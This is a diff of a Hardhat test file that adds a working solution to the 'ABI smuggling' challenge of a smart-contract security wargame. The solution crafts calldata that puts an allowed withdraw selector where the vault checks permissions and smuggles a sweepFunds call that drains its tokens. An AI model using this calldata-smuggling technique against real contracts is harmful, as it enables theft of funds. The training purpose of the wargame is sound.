@@ -1,15 +1,15 @@
 const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { expect, util } = require('chai');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
     let token, vault;
-    
+
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, player, recovery ] = await ethers.getSigners();
+        [deployer, player, recovery] = await ethers.getSigners();
 
         // Deploy Damn Valuable Token contract
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
@@ -44,7 +44,33 @@ describe('[Challenge] ABI smuggling', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR  HERE */
+        const { hexZeroPad, hexConcat } = ethers.utils
+
+        //[selectorOffset,length,data]
+        //[exploitOffset,nops,withdrawSelector,length,data]
+        const executeFn = vault.interface.getFunction('execute')
+        const executeFnSelector = vault.interface.getSighash(executeFn)
+        const withdrawFn = vault.interface.getFunction('withdraw')
+        const withdrawFnSelctor = vault.interface.getSighash(withdrawFn)
+
+        const target = hexZeroPad(vault.address, 32)
+        const nops = hexZeroPad(0x0, 32)
+        const exploitOffset = hexZeroPad(0x64, 32)
+        const expoitSize = hexZeroPad(0x44, 32)
+        const expoitData = vault.interface.encodeFunctionData('sweepFunds', [recovery.address, token.address])
+
+        const actionData = hexConcat([exploitOffset, nops, withdrawFnSelctor, expoitSize, expoitData])
+        const inputData = hexConcat([executeFnSelector, target, actionData])
+
+        const tx = {
+            to: vault.address,
+            data: inputData
+        }
+
+        const resp = await player.sendTransaction(tx)
+
+        console.log((await resp.wait()).logs)
     });
 
     after(async function () {
